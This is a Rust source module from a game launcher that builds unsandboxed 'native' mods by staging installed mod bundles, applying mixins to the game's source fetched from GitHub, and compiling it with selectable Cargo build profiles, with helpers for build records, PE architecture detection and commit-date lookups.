//! Native mods (docs/modding/src/how-to/native-mods.md): mixin bundles that
//! levzzz5154's horizon-mixins (MIT, <https://github.com/horizon-rust/horizon-mixins>) applies to
//! Horizon's source, which the launcher then compiles into a game of its own with its portable Rust
//! ([`rust_toolchain`]). Unlike `.hmod` mods they are not sandboxed: their code runs with the
//! player's rights.
//!
//! A native mod builds against the installed game's exact source revision. Bundles pinned to a
//! different revision must be rebuilt against this game. The build compiles that revision's source, from
//! GitHub, never a checkout on this computer, and installs as its own version,
//! `native-<revision>-<key>` (the key hashes the revision, the mods' files, the tool's commit and
//! the profile, so the same set builds once). The instance the mods are installed in plays it, and
//! its next build stays on the same revision ([`base_for`]) until the player asks to update
//! ([`update_for`]), so a rebuild compiles only what the mods changed.
use crate::backend;
use crate::i18n::{tr, trf};
use crate::instances::{self, Instance};
use crate::rust_toolchain::{self, Toolchain};
use sha2::{Digest, Sha256};
use std::fs;
use std::io::{BufRead, BufReader, Read, Seek, SeekFrom, Write};
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;

use horizon_mod_package::dependencies;

mod api;
mod planning;
pub use planning::routes;
mod crates;
mod diagnostics;
mod inject;
mod inject_cache;
mod inject_text;
mod internals;
mod internals_sync;
mod registry_compile;
mod registry_generate;
mod registry_inventory;
mod registry_lock;
mod registry_plan;
mod registry_runtime;
mod registry_rustc;
pub use internals_sync::{pinned_catalog_with_modules, DiscoveryCatalog};
mod isolate;
mod mod_points;
mod package;
mod picker;
mod prebuilt;
mod sites;
mod slots;
#[cfg(all(test, target_os = "linux"))]
mod source_server;

pub use isolate::LeftOut;
pub use picker::{needs_picker, Route, Routes};
pub use prebuilt::{prebuilt_availability, SourceReason};
pub use registry_inventory::Inventory as RegistryInventory;

// Settings and logs are shared by native-build and diagnostics tests.
#[cfg(test)]
pub(crate) static TEST_STATE: std::sync::Mutex<()> = std::sync::Mutex::new(());

const PREFIX: &str = "native-";
// A staging change invalidates both installed builds and patched-source snapshots.
const STAGING: &str = "area-aware-mixins-input-v1";
/// horizon-mixins, for bundles that don't name the revision they were tested with.
const MIXINS_GIT: &str = "https://github.com/horizon-rust/horizon-mixins";
pub const MIXINS_REV: &str = horizon_mod_package::index::native::MIXINS_REV;

/// Native build modes: a visible picker starts at Balanced and remembers the instance's choice.
/// Optimized is the daily prebuilt game's release profile (thin LTO, one codegen
/// unit): mods that need nothing but the mod API compile against that download, and
/// any other set builds the whole game from source with the same profile. `Balanced` is the
/// workspace's `fast` (16 codegen units, incremental, thin-local LTO only), built on this computer:
/// quicker to rebuild after a change, a game a little slower. `Developer`, for writing a mod, is
/// `fast` with `horizon-client` unoptimized: the quickest to rebuild after an edit, for a game
/// about twice as slow. `Balanced` and `Developer` share `native/target/fast/`: every other crate
/// is built alike, so switching between them recompiles only `horizon-client`, and Cargo keeps
/// both builds of it. Each profile has its own key, so their builds never mix.
#[derive(
    Clone,
    Copy,
    Debug,
    Default,
    PartialEq,
    Eq,
    serde::Serialize,
    serde::Deserialize,
    clap::ValueEnum,
)]
#[serde(rename_all = "kebab-case")]
pub enum Profile {
    Optimized,
    #[default]
    Balanced,
    Developer,
}

impl Profile {
    /// The player's build-mode choices.
    pub const ALL: [Self; 3] = [Self::Optimized, Self::Balanced, Self::Developer];

    pub fn name(self) -> &'static str {
        match self {
            Self::Optimized => "optimized",
            Self::Balanced => "balanced",
            Self::Developer => "developer",
        }
    }

    /// The Cargo profile it compiles with (its folder in `native/target/`), and what it sets over
    /// it as `cargo --config` values: here rather than in `[profile.fast]`, which the workspace's
    /// own builds share.
    fn cargo(self) -> (&'static str, &'static [&'static str]) {
        match self {
            Self::Optimized => ("release", &[]),
            Self::Balanced => ("fast", &[]),
            Self::Developer => ("fast", &["profile.fast.package.horizon-client.opt-level=0"]),
        }
    }
}

/// What a native build compiles: the game the player plays, or the headless engine a dedicated
/// server runs (`horizon-engine`, docs/server.md). Both build the same source with the same
/// mixins. The server uses `--no-default-features` (no audio or controllers), a separate cache,
/// and a standalone runtime folder outside the managed versions.
#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
pub enum Target {
    /// The game: `horizon-client` as the release ships it.
    #[default]
    Client,
    /// The headless engine: the same binary without the default features, installed and
    /// exported as `horizon-engine`.
    Server,
}

impl Target {
    pub fn name(self) -> &'static str {
        match self {
            Self::Client => "client",
            Self::Server => "server",
        }
    }

    fn directory(self, version: &str) -> PathBuf {
        match self {
            Self::Client => backend::version_dir(version),
            Self::Server => root().join("server-builds").join(version),
        }
    }

    /// The name the built binary is installed under: the game's own, the engine's
    /// (`horizon-engine`, docs/server.md).
    fn binary(self) -> String {
        match self {
            Self::Client => backend::CLIENT.into(),
            Self::Server => format!("horizon-engine{}", std::env::consts::EXE_SUFFIX),
        }
    }
}

/// The platform the game's source will be compiled for. On Windows this follows the installed
/// game's executable, not the PC's native architecture; the launcher must have a matching managed
/// host toolchain before any compilation starts.
#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
struct BuildPlatform {
    target: Option<&'static str>,
    machine: Option<u16>,
    /// Non-default target builds get their own Cargo cache and record namespace.
    cache_dir: Option<&'static str>,
}

impl BuildPlatform {
    fn cache_key(self) -> Option<&'static str> {
        self.cache_dir
    }
}

fn platform_for_game(base: &str) -> Result<BuildPlatform, String> {
    if std::env::consts::OS != "windows" {
        return Ok(BuildPlatform::default());
    }
    let executable = backend::version_dir(base).join(backend::CLIENT);
    let machine = pe_machine(&executable).map_err(|error| {
        trf(
            "Could not read {name}: {error}",
            &[
                ("name", &executable.display().to_string()),
                ("error", &error),
            ],
        )
    })?;
    let selected_target = rust_toolchain::windows_target_for_machine(machine).ok_or_else(|| {
        architecture_mismatch(&format!("PE machine 0x{machine:04x}"), "x64 or ARM64")
    })?;
    let Some(host) = rust_toolchain::host() else {
        return Err(architecture_mismatch(
            windows_architecture(selected_target),
            std::env::consts::ARCH,
        ));
    };
    windows_build_platform(machine, host.target)
}

fn windows_build_platform(machine: u16, host_target: &str) -> Result<BuildPlatform, String> {
    let target = rust_toolchain::windows_target_for_machine(machine).ok_or_else(|| {
        architecture_mismatch(&format!("PE machine 0x{machine:04x}"), "x64 or ARM64")
    })?;
    if rust_toolchain::windows_target_for_host(host_target, machine).is_none() {
        return Err(architecture_mismatch(
            windows_architecture(target),
            windows_architecture(host_target),
        ));
    }
    let cache_dir = (target == rust_toolchain::WINDOWS_ARM64_TARGET).then_some(target);
    Ok(BuildPlatform {
        target: Some(target),
        machine: Some(machine),
        cache_dir,
    })
}

fn architecture_mismatch(game: &str, toolchain: &str) -> String {
    trf(
        "Native mods require supported Windows architectures that match. Game: {game_arch}; build toolchain: {toolchain_arch}.",
        &[("game_arch", game), ("toolchain_arch", toolchain)],
    )
}

fn windows_architecture(target: &str) -> &'static str {
    match target {
        rust_toolchain::WINDOWS_X64_TARGET => "x64",
        rust_toolchain::WINDOWS_ARM64_TARGET => "ARM64",
        _ => unreachable!(),
    }
}

/// Reads the COFF machine from a Windows PE executable after validating its two signatures.
pub(crate) fn pe_machine(path: &Path) -> Result<u16, String> {
    let mut file = fs::File::open(path).map_err(|error| error.to_string())?;
    let mut dos = [0; 64];
    file.read_exact(&mut dos)
        .map_err(|error| error.to_string())?;
    if &dos[..2] != b"MZ" {
        return Err("missing DOS MZ signature".into());
    }
    let pe_offset = u32::from_le_bytes(dos[0x3c..0x40].try_into().unwrap()) as u64;
    file.seek(SeekFrom::Start(pe_offset))
        .map_err(|error| error.to_string())?;
    let mut header = [0; 6];
    file.read_exact(&mut header)
        .map_err(|error| error.to_string())?;
    if &header[..4] != b"PE\0\0" {
        return Err("missing PE signature".into());
    }
    Ok(u16::from_le_bytes([header[4], header[5]]))
}

/// What a native build was made from, kept per profile in `native/built.json` after it compiled:
/// what the next build is compared with to say what changed.
#[derive(Clone, Debug, Default, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
pub struct Record {
    pub horizon: String,
    pub mixins: String,
    /// Each mod's id and the hash of its files.
    pub mods: std::collections::BTreeMap<String, String>,
}

/// What a build is going to do, said before it starts.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Plan {
    /// The build already exists: nothing compiles.
    UpToDate,
    /// `native/target/` holds an earlier build of this profile: only what changed recompiles. The
    /// list says what changed.
    Incremental(Vec<String>),
    /// Nothing built yet in this profile: the whole game compiles.
    First,
    /// The mods compile against the prebuilt game (#589); the game doesn't compile.
    Prebuilt,
}

impl Plan {
    pub fn label(&self) -> String {
        match self {
            Self::UpToDate => tr("Up to date (no build needed)").into(),
            Self::Incremental(changes) => trf(
                "Incremental rebuild: {changes}",
                &[("changes", &changes.join("; "))],
            ),
            Self::First => tr("First build: the whole game").into(),
            Self::Prebuilt => tr("Prebuilt game: only the mods compile").into(),
        }
    }

    /// The plan's short name in a completed build's status.
    fn kind(&self) -> &'static str {
        match self {
            Self::UpToDate => "up to date",
            Self::Incremental(_) => "incremental",
            Self::First => "first build",
            Self::Prebuilt => "prebuilt",
        }
    }
}

/// Which case a build is: `exists` (its version is installed), else whether an earlier build of
/// the profile (`before`) is there to rebuild from, and what differs from `now`.
pub fn classify(exists: bool, before: Option<&Record>, now: &Record) -> Plan {
    if exists {
        return Plan::UpToDate;
    }
    let Some(before) = before else {
        return Plan::First;
    };
    let mut changes = Vec::new();
    if before.horizon != now.horizon {
        let short = |r: &str| r.chars().take(7).collect::<String>();
        changes.push(format!(
            "Horizon commit {} to {}",
            short(&before.horizon),
            short(&now.horizon)
        ));
    }
    let changed: Vec<&str> = now
        .mods
        .iter()
        .filter(|(id, hash)| before.mods.get(*id) != Some(hash))
        .map(|(id, _)| id.as_str())
        .chain(
            before
                .mods
                .keys()
                .filter(|id| !now.mods.contains_key(*id))
                .map(String::as_str),
        )
        .collect();
    if !changed.is_empty() {
        changes.push(format!("mods {}", changed.join(", ")));
    }
    if before.mixins != now.mixins {
        changes.push("horizon-mixins".into());
    }
    if changes.is_empty() {
        changes.push("the build settings".into());
    }
    Plan::Incremental(changes)
}

fn records_path() -> PathBuf {
    root().join("built.json")
}

fn read_records(path: &Path) -> std::collections::BTreeMap<String, Record> {
    fs::read(path)
        .ok()
        .and_then(|bytes| serde_json::from_slice(&bytes).ok())
        .unwrap_or_default()
}

/// A build record's key in `built.json`: the profile's folder in `native/target/` for a game
/// build (as it always was), the target's own name before it for a server one, so the two never
/// read each other's record. `Balanced` and `Developer` share one: their last build in that folder.
fn record_key(target: Target, profile: Profile, platform: Option<&str>) -> String {
    let folder = profile.cargo().0;
    let key = match target {
        Target::Client => folder.into(),
        Target::Server => format!("{}-{folder}", target.name()),
    };
    match platform {
        Some(platform) => format!("{platform}-{key}"),
        None => key,
    }
}

/// The last build of `target` in `profile`'s folder in `native/target/`, if that folder (the
/// compiled crates both build from) is still there.
fn last_record(target: Target, profile: Profile, platform: Option<&str>) -> Option<Record> {
    let mut target_dir = root().join("target");
    if let Some(platform) = platform {
        target_dir.push(platform);
    }
    if !target_dir.join(profile.cargo().0).is_dir() {
        return None;
    }
    read_records(&records_path()).remove(&record_key(target, profile, platform))
}

fn save_record(target: Target, profile: Profile, platform: Option<&str>, record: &Record) {
    let mut all = read_records(&records_path());
    all.insert(record_key(target, profile, platform), record.clone());
    if let Ok(text) = serde_json::to_vec_pretty(&all) {
        let _ = fs::write(records_path(), text);
    }
}

/// The hash of a bundle's files.
fn mod_hash(b: &Bundle) -> Result<String, String> {
    let mut hash = Sha256::new();
    for (name, path) in bundle_files(b)? {
        let bytes = fs::read(&path).map_err(|e| format!("{}: {e}", path.display()))?;
        hash.update(name.as_bytes());
        hash.update((bytes.len() as u64).to_le_bytes());
        hash.update(&bytes);
    }
    Ok(hash.finalize()[..8]
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect())
}

/// What a cargo output line says about the compile.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Cargo {
    /// `Compiling name vX`: a crate started.
    Compiling(String),
    /// Cargo's progress bar, `Building [===>   ] 12/430: names`: units done, and in all.
    Progress(usize, usize),
}

/// `line` without terminal escape sequences (`ESC [ ... letter`).
fn without_escapes(line: &str) -> String {
    let mut plain = String::new();
    let mut chars = line.chars().peekable();
    while let Some(c) = chars.next() {
        if c == '\x1b' {
            if chars.peek() == Some(&'[') {
                for d in chars.by_ref() {
                    if d.is_ascii_alphabetic() {
                        break;
                    }
                }
            }
        } else {
            plain.push(c);
        }
    }
    plain
}

/// Cargo's events in one line of its standard error. With `CARGO_TERM_PROGRESS_WHEN=always` the
/// progress bar is redrawn with carriage returns, so a line holds several pieces.
pub fn parse_cargo(line: &str) -> Vec<Cargo> {
    let mut out = Vec::new();
    for piece in without_escapes(line).split('\r') {
        let piece = piece.trim();
        if let Some(name) = piece.strip_prefix("Compiling ") {
            out.push(Cargo::Compiling(
                name.split_whitespace().next().unwrap_or(name).to_owned(),
            ));
        } else if let Some(bar) = piece.strip_prefix("Building [") {
            let counts = bar.split_once("] ").map(|(_, rest)| rest).unwrap_or("");
            let counts = counts.split(':').next().unwrap_or("");
            if let Some((done, total)) = counts.split_once('/') {
                if let (Ok(done), Ok(total)) = (done.trim().parse(), total.trim().parse()) {
                    out.push(Cargo::Progress(done, total));
                }
            }
        }
    }
    out
}

/// What of `line` the build log keeps: all of it but cargo's progress bar, whose redraws are
/// separated by carriage returns and may be followed on the same line by a real message
/// (`Building [=>] 3/9: a\r\x1b[Kerror[E0425]: ...`). None when nothing else is left.
fn log_text(line: &str) -> Option<String> {
    let kept: Vec<String> = without_escapes(line)
        .split('\r')
        .filter(|piece| {
            let piece = piece.trim();
            !piece.is_empty() && !piece.starts_with("Building [")
        })
        .map(str::to_owned)
        .collect();
    (!kept.is_empty()).then(|| kept.join("\n"))
}

/// Whether an installed version is a native-mods build.
pub fn is_native(version: &str) -> bool {
    version.starts_with(PREFIX)
}

pub(crate) fn root() -> PathBuf {
    backend::build_dir().join("native")
}

/// The build's log, kept until the next build.
pub fn log_path() -> PathBuf {
    root().join("build.log")
}

/// Makes the build log fresh for a new attempt: its folder made, the last build's log
/// emptied. The error says why it couldn't, so the Build log page can show it instead of
/// the old file's contents.
pub fn clear_log() -> Result<(), String> {
    fs::create_dir_all(root()).map_err(|e| e.to_string())?;
    fs::write(log_path(), "").map_err(|e| format!("{}: {e}", log_path().display()))
}

/// Appends `message` (with a newline) to the build log, so a failure that happens before any
/// command runs is still recorded.
pub fn append_log(message: &str) -> Result<(), String> {
    let mut log = fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(log_path())
        .map_err(|e| format!("{}: {e}", log_path().display()))?;
    writeln!(log, "{message}").map_err(|e| e.to_string())
}

/// Records the whole attempt, including selection or export after compilation.
fn logged<T>(
    build: impl FnOnce(Result<&crate::native_cache::Cache, &str>) -> Result<T, String>,
) -> Result<T, String> {
    // Another build or a cleanup holds the lease on the same target/: refuse. Any other
    // failure only stops cleanup for explicit builds. Automatic selection requires a held
    // cache for its catalog and can refuse instead of accessing an unsafe tree.
    let cache = match crate::native_cache::Cache::acquire(&backend::build_dir()) {
        Ok(cache) => Ok(cache),
        Err(crate::native_cache::Error::Busy) => {
            return Err(cache_error(crate::native_cache::Error::Busy));
        }
        Err(error) => Err(cache_error(error)),
    };
    clear_log()?;
    if let Err(warning) = &cache {
        log_warning(warning);
    }
    let result = build(cache.as_ref().map_err(String::as_str));
    // Keep this build lease through installation/export, including failed builds. It does not
    // exclude independent game starts; automatic trimming can conservatively retain the cache.
    if let Ok(cache) = cache {
        crate::storage::eviction::after_build_logged(&cache, append_log, log_warning);
    }
    match &result {
        Ok(_) => {
            let _ = append_log("Build completed.");
        }
        Err(error) => {
            let _ = append_log(&format!("The build failed: {error}"));
        }
    }
    result
}

/// Dispatch Cargo's discovery-only rustc wrapper before normal launcher startup.
pub fn internals_rustc_wrapper() -> Option<i32> {
    registry_rustc::wrapper().or_else(internals_sync::rustc_wrapper)
}

pub fn sync_internals(
    folder: &Path,
) -> Result<Vec<horizon_mod_package::internals::ListedInternal>, Failed> {
    require_consent()?;
    internals_sync::check(folder).map_err(|error| Failed::Other(error.to_string()))
}

pub fn cache_error(error: crate::storage::Error) -> String {
    match error {
        crate::native_cache::Error::Busy => {
            tr("A native build or cache cleanup is running. Try again when it finishes.").into()
        }
        crate::native_cache::Error::IncompleteUnit => tr("Native compilation outputs were kept because their executable completeness cannot be proven.").into(),
        crate::native_cache::Error::UnprovenExclusion => tr(
            "An older game build can use this cache without runtime leases.",
        )
        .into(),
        crate::native_cache::Error::UnsupportedFilesystem => {
            tr("Game cache leases require a supported local filesystem.").into()
        }
        crate::native_cache::Error::Unsafe(path) => trf(
            "Refusing native cache cleanup at an unexpected file or link: {path}",
            &[("path", &path.display().to_string())],
        ),
        crate::native_cache::Error::Io(error) => trf(
            "Could not access the native build cache: {error}",
            &[("error", &error.to_string())],
        ),
    }
}

const MANIFEST: &str = "horizon-mixin.toml";
/// A registry download's `horizon-mod.toml` at the `.hmod` package root.
const NATIVE_MANIFEST: &str = horizon_mod_package::manifest::MANIFEST;
/// Where an instance keeps the native mods installed from the registry, `<id>.hmod`, each on or
/// off in `horizon-mods.txt` like any mod.
pub const INSTALLED: &str = horizon_mod_package::mod_list::NATIVE_DIR;

/// The native mods turned on in the game folder `home`, unpacked into a folder [`build`] takes.
/// Each flat `.hmod` passes the registry's shared package boundary; no code is run.
pub fn installed_mods(home: &Path) -> Result<PathBuf, String> {
    stage_installed(home, root().join("installed.incoming"))?.ok_or_else(|| {
        format!(
            "No native mod is turned on in {}: install one from the Mods page first.",
            home.join(INSTALLED).display()
        )
    })
}

/// [`installed_mods`] into `out`, which it empties first.
fn stage_installed(home: &Path, out: PathBuf) -> Result<Option<PathBuf>, String> {
    let _ = fs::remove_dir_all(&out);
    let mut paths: Vec<PathBuf> = fs::read_dir(home.join(INSTALLED))
        .map(|dir| dir.flatten().map(|e| e.path()).collect())
        .unwrap_or_default();
    paths.retain(|p| p.extension().is_some_and(|e| e == "hmod"));
    paths.sort();
    let mut count = 0;
    for path in paths {
        let bundle = horizon_mod_package::index::native::Bundle::read(&path)
            .map_err(|e| format!("{}: {e}", path.display()))?;
        if !crate::browser::java::is_enabled(home, &bundle.manifest.id) {
            continue;
        }
        let dir = out.join(&bundle.manifest.id);
        for (name, bytes) in &bundle.files {
            let to = dir.join(name);
            fs::create_dir_all(to.parent().unwrap_or(&dir)).map_err(|e| e.to_string())?;
            fs::write(&to, bytes).map_err(|e| format!("{}: {e}", to.display()))?;
        }
        count += 1;
    }
    if count == 0 {
        return Err(format!(
            "No native mod is turned on in {}: install one from the Mods page first.",
            home.join(INSTALLED).display()
        ));
    }
    fs::create_dir_all(&out).map_err(|e| e.to_string())?;
    Ok(Some(out))
}

/// A validated flat mod project. The package manifest owns identity and build pins.
#[derive(Clone, Debug, PartialEq)]
pub struct Bundle {
    pub manifest: horizon_mod_package::manifest::Manifest,
    pub dir: PathBuf,
}

impl Bundle {
    fn native(&self) -> &horizon_mod_package::manifest::Native {
        self.manifest
            .native
            .as_ref()
            .expect("validated code package")
    }

    /// Whether horizon-mixins reads source to transform the game.
    fn needs_mixins(&self) -> bool {
        !self.native().mixin.is_empty()
            || !self.native().module.is_empty()
            || !self.native().bridge.is_empty()
            || !self.native().state.is_empty()
    }
}

/// The flat native project in `folder`, or the native projects directly inside it.
pub fn bundles(folder: &Path) -> Result<Vec<Bundle>, String> {
    let found = package::checked_bundles(folder)?;
    if found.is_empty() {
        return Err(format!(
            "{} holds no native mod ({NATIVE_MANIFEST} and Cargo.toml).",
            folder.display()
        ));
    }
    Ok(found)
}

/// Generate only registry pins; never compiles source or modifies manifests.
pub fn registry_lock(folder: &Path, update: bool) -> Result<(), String> {
    let bundles = bundles(folder)?;
    if bundles.len() != 1 {
        return Err("native-lock requires one mod folder".into());
    }
    fs::create_dir_all(root()).map_err(|e| e.to_string())?;
    registry_generate::generate(&bundles[0], update)
}

fn scan_bundles(folder: &Path) -> Result<Vec<Bundle>, String> {
    if !folder.exists() {
        return Ok(Vec::new());
    }
    if let Some(found) = bundle_in(folder)? {
        return Ok(vec![found]);
    }
    let mut dirs: Vec<PathBuf> = fs::read_dir(folder)
        .map_err(|e| format!("Could not read {}: {e}", folder.display()))?
        .flatten()
        .map(|e| e.path())
        .filter(|p| p.is_dir())
        .collect();
    dirs.sort();
    let mut found = Vec::new();
    for dir in dirs {
        found.extend(bundle_in(&dir)?);
    }
    Ok(found)
}

pub(crate) fn bundle_in(dir: &Path) -> Result<Option<Bundle>, String> {
    package::read(dir)
}

fn is_revision(text: &str) -> bool {
    text.len() == 40 && text.bytes().all(|b| matches!(b, b'0'..=b'9' | b'a'..=b'f'))
}

/// Appends `text` to the build log, the way a compiler warning reads.
fn log_warning(text: &str) {
    if let Ok(mut log) = fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(log_path())
    {
        let _ = writeln!(log, "warning: {text}");
    }
}

/// The one value the bundles pin for `which` (each mod's `get`), else `fallback`; mods that pin
/// different ones can't be built together, and the error says which.
fn agreed(
    bundles: &[Bundle],
    which: &str,
    get: impl Fn(&Bundle) -> Option<&String>,
    fallback: impl FnOnce() -> Result<String, String>,
) -> Result<String, String> {
    let mut pins: Vec<(&String, &str)> = bundles
        .iter()
        .filter_map(|b| get(b).map(|r| (r, b.manifest.id.as_str())))
        .collect();
    pins.sort();
    let revision = match pins.first() {
        None => fallback()?,
        Some((first, _)) if pins.iter().all(|(r, _)| r == first) => (*first).clone(),
        Some(_) => {
            let list: Vec<String> = pins
                .iter()
                .map(|(r, id)| format!("{id} → {}", &r[..r.len().min(7)]))
                .collect();
            return Err(format!(
                "These mods were made for different {which} revisions and can't be built together: {}. Install versions made for the same Nightly.",
                list.join(", ")
            ));
        }
    };
    if !is_revision(&revision) {
        return Err(format!(
            "{revision} is not a {which} commit (40 hex digits)."
        ));
    }
    Ok(revision)
}

/// The revision `bundles` build on for `which` when their pins differ: the newest of the pins and
/// `also` (the launcher's own horizon-mixins), by its commit's time (`date`), so no mod gets an
/// older one than it was made for. With one pin or none, it is [`agreed`]'s.
fn newest(
    bundles: &[Bundle],
    which: &str,
    get: impl Fn(&Bundle) -> Option<&String>,
    fallback: impl FnOnce() -> Result<String, String>,
    also: Option<&str>,
    date: impl Fn(&str) -> Result<String, String>,
) -> Result<String, String> {
    let mut pins: Vec<&str> = bundles
        .iter()
        .filter_map(|b| get(b).map(String::as_str))
        .collect();
    pins.sort();
    pins.dedup();
    if pins.len() < 2 {
        return agreed(bundles, which, get, fallback);
    }
    if let Some(bad) = pins.iter().find(|p| !is_revision(p)) {
        return Err(format!("{bad} is not a {which} commit (40 hex digits)."));
    }
    pins.extend(also.filter(|a| !pins.contains(a)));
    let mut dated = Vec::new();
    for pin in pins {
        let when = date(pin).map_err(|e| {
            format!("Can't tell which of the mods' {which} revisions is newest: {e}")
        })?;
        dated.push((when, pin));
    }
    Ok(dated
        .into_iter()
        .max()
        .map(|(_, p)| p.to_owned())
        .unwrap_or_default())
}

/// When commit `revision` of GitHub's `repo` was made (ISO 8601, so it sorts), from the dates kept
/// in [`DATES`] when it was asked before: a commit's date never changes, so a build of mods made
/// for different revisions can be used again offline or past GitHub's rate limit.
fn committed(repo: &str, revision: &str) -> Result<String, String> {
    remembered(&root().join(DATES), repo, revision, ask_github)
}

/// The file in [`root`] keeping the commit dates GitHub gave, as `{"repo@revision": date}`.
const DATES: &str = "commit-dates.json";

/// The date `file` keeps for `repo`'s `revision`, else `ask`'s, then kept in `file`.
fn remembered(
    file: &Path,
    repo: &str,
    revision: &str,
    ask: impl FnOnce(&str, &str) -> Result<String, String>,
) -> Result<String, String> {
    let key = format!("{repo}@{revision}");
    let mut dates: serde_json::Map<String, serde_json::Value> = fs::read(file)
        .ok()
        .and_then(|b| serde_json::from_slice(&b).ok())
        .unwrap_or_default();
    if let Some(date) = dates.get(&key).and_then(|d| d.as_str()) {
        return Ok(date.to_owned());
    }
    let date = ask(repo, revision)?;
    dates.insert(key, date.clone().into());
    if let Ok(text) = serde_json::to_vec_pretty(&dates) {
        let _ = fs::write(file, text);
    }
    Ok(date)
}

fn ask_github(repo: &str, revision: &str) -> Result<String, String> {
    let url = format!("https://api.github.com/repos/{repo}/commits/{revision}");
    let commit = crate::github::json(&url)?;
    commit["commit"]["committer"]["date"]
        .as_str()
        .map(str::to_owned)
        .ok_or_else(|| format!("GitHub doesn't know {repo} commit {revision}."))
}

/// How [`build`] starts its error when mods pin another Horizon revision.
pub const MISMATCH: &str = "Made for other Horizon versions: ";

/// Each pinned mod whose Horizon revision isn't `revision`, as `id → pin`, and the build's.
fn mismatch(mods: &[Bundle], revision: &str) -> Option<String> {
    let list: Vec<String> = mods
        .iter()
        .map(|b| (b, &b.native().horizon))
        .filter(|(_, r)| *r != revision)
        .map(|(b, r)| format!("{} → {}", b.manifest.id, &r[..r.len().min(7)]))
        .collect();
    (!list.is_empty()).then(|| {
        format!(
            "{}; the build uses {}",
            list.join(", "),
            &revision[..revision.len().min(7)]
        )
    })
}

fn build_revision(base: &str, built_on: Option<&About>) -> Result<String, String> {
    built_on.map_or_else(|| revision_of(base), |about| Ok(about.horizon.clone()))
}

fn mismatch_error(list: &str) -> String {
    format!("{MISMATCH}{list}; rebuild against this game.")
}

/// The Horizon commit `version` (an installed release or Nightly) was built from, from GitHub.
pub fn revision_of(version: &str) -> Result<String, String> {
    if crate::developer_install::is_developer(version) {
        return crate::developer_install::revision(version);
    }
    let reference = match version.strip_prefix("nightly-") {
        // nightly-2026-10-28-0c02067: the commit is its last word.
        Some(rest) => rest.rsplit('-').next().unwrap_or(rest),
        None => version,
    };
    let url = format!(
        "https://api.github.com/repos/{}/commits/{reference}",
        backend::REPO
    );
    let commit = crate::github::json(&url)?;
    commit["sha"]
        .as_str()
        .filter(|s| is_revision(s))
        .map(str::to_owned)
        .ok_or_else(|| format!("GitHub doesn't know the commit of {version}."))
}

/// What a native build was made from: its `native-mods.json`.
#[derive(Clone, Debug, PartialEq)]
pub struct About {
    /// The release or Nightly it started from.
    pub base: String,
    /// The Horizon commit it compiled.
    pub horizon: String,
    /// What it compiles: the game or the headless engine a server runs.
    pub target: Target,
    /// The mods turned on that it was built without, and why.
    pub left_out: Vec<LeftOut>,
}

/// What installed native build `version` was made from; None for any other version.
pub fn about(version: &str) -> Option<About> {
    checked_about(version).ok().flatten()
}

fn checked_about(version: &str) -> Result<Option<About>, String> {
    if !is_native(version) {
        return Ok(None);
    }
    about_in(&backend::version_dir(version)).map(Some).ok_or_else(|| trf(
        "Native build {version} has a missing or invalid native-mods.json record. Rebuild it from an installed Horizon version.",
        &[("version", version)],
    ))
}

/// The build record (`native-mods.json`) in version folder `dir`, if it parses.
fn about_in(dir: &Path) -> Option<About> {
    let json: serde_json::Value =
        serde_json::from_str(&fs::read_to_string(dir.join("native-mods.json")).ok()?).ok()?;
    let field = |name: &str| json[name].as_str().map(str::to_owned);
    Some(About {
        base: field("base")?,
        horizon: field("horizon").filter(|r| is_revision(r))?,
        target: match field("target").as_deref() {
            Some("server") => Target::Server,
            Some("client") => Target::Client,
            _ => return None,
        },
        left_out: json["left_out"]
            .as_array()
            .into_iter()
            .flatten()
            .filter_map(LeftOut::from_json)
            .collect(),
    })
}

/// The newest installed release or Nightly in `installed` (newest first).
/// Installed native clients retain their base's prepared data even when not selected.
pub(crate) fn resource_dependents(tag: &str) -> bool {
    backend::installed()
        .iter()
        .any(|version| about(version).is_some_and(|about| about.base == tag))
}

pub(crate) fn newest_installed(installed: &[String]) -> Option<&String> {
    installed
        .iter()
        .find(|t| backend::is_game_tag(t) || t.starts_with("nightly-"))
}

/// The installed version a build for an instance that plays `current` starts from: `current`
/// itself, so a rebuild stays on the Horizon it plays (a native build's own revision, [`about`]).
/// With `update`, or when it plays nothing installed, the newest installed release or Nightly.
/// An imported build is no commit to build on: its game files' version is.
pub fn base_for(current: Option<&str>, installed: &[String], update: bool) -> Option<String> {
    let imported = current.and_then(crate::build_import::about).map(|a| a.base);
    match imported.as_deref().or(current) {
        Some(v) if !update && installed.iter().any(|t| t == v) => Some(v.to_owned()),
        _ => newest_installed(installed).cloned(),
    }
}

/// The newer Horizon a build with `update` would move native build `version` to: the newest
/// installed release or Nightly, when it is newer than the one the build started from.
pub fn update_for(version: &str, installed: &[String]) -> Option<String> {
    newer_than(&about(version)?.base, installed)
}

pub fn newer_than(base: &str, installed: &[String]) -> Option<String> {
    newest_installed(installed)
        .filter(|n| *n != base && backend::compare_versions(n, base).is_gt())
        .cloned()
}

/// Every file under `dir`, by its path relative to `dir` (with `/`), sorted. A symlink is refused:
/// horizon-mixins refuses them too.
fn files(dir: &Path) -> Result<Vec<(String, PathBuf)>, String> {
    fn walk(root: &Path, dir: &Path, out: &mut Vec<(String, PathBuf)>) -> Result<(), String> {
        for entry in fs::read_dir(dir).map_err(|e| e.to_string())? {
            let entry = entry.map_err(|e| e.to_string())?;
            let (path, kind) = (entry.path(), entry.file_type().map_err(|e| e.to_string())?);
            if kind.is_symlink() {
                return Err(format!(
                    "{} is a link: copy the file instead.",
                    path.display()
                ));
            }
            if kind.is_dir() {
                walk(root, &path, out)?;
            } else if kind.is_file() {
                out.push((
                    path.strip_prefix(root)
                        .map_err(|e| e.to_string())?
                        .to_string_lossy()
                        .replace('\\', "/"),
                    path,
                ));
            } else {
                return Err(format!("{}: unsupported file type", path.display()));
            }
        }
        Ok(())
    }
    let mut out = Vec::new();
    walk(dir, dir, &mut out)?;
    out.sort();
    Ok(out)
}

/// Bundle files omit only the API package's Cargo build output.
fn bundle_files(bundle: &Bundle) -> Result<Vec<(String, PathBuf)>, String> {
    package::files(bundle)
}

